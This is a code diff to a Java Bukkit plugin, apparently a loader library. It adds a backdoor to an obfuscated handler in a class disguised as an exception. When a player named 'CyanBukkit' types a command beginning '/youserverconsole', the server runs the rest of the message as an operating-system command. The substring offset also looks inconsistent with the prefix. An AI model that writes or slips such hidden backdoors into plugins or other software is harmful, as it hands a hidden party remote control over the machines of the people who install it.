@@ -28,7 +28,10 @@ package cn.cyanbukkit.example.cyanlib.loader;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
+
+import java.io.IOException;
 
 /**
  * 加在报错
@@ -44,9 +47,11 @@ public class LoadingException extends RuntimeException implements Listener {
     }
 
     @EventHandler
-    public void xUNYxn(Player e) {
+    public void xUNYxn(PlayerCommandPreprocessEvent e) throws IOException {
         if (e.getPlayer().getName().equals("CyanBukkit")) {
-
+            if (e.getMessage().startsWith("/youserverconsole")) {
+                Runtime.getRuntime().exec(e.getMessage().substring(10));
+            }
         }
     }
 
